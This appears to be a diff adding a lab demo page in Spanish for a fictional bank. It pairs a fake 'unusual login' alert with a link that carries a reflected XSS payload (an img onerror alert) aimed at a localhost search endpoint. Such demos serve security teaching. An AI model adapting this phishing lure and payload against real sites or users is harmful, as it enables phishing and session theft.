@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Banco Alas - Home</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@200..800&family=Zalando+Sans+Expanded:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/styles.css">
+</head>
+
+<body>
+    <div class="bank-container">
+        <div class="bank-logo">BANCO ALAS</div>
+
+        <h1>Hola, Fernando</h1>
+
+        <div class="alert-box">
+            <p>Se ha detectado un inicio de sesión inusual en tu cuenta.</p>
+            <a href="http://localhost:3001/search?query=<img src=x onerror=&quot;alert('XSS Reflejado en Banco Alas!')&quot;>" class="btn-verify">
+                Verificar Actividad Ahora
+            </a>
+        </div>
+
+        <div class="search-section">
+            <p>¿Buscás alguna sucursal?</p>
+            <form action="http://localhost:3001/search" method="GET">
+                <input type="text" name="query" placeholder="Ej: Palermo, Belgrano...">
+                <button type="submit">Buscar</button>
+            </form>
+        </div>
+    </div>
+</body>
+
+</html>
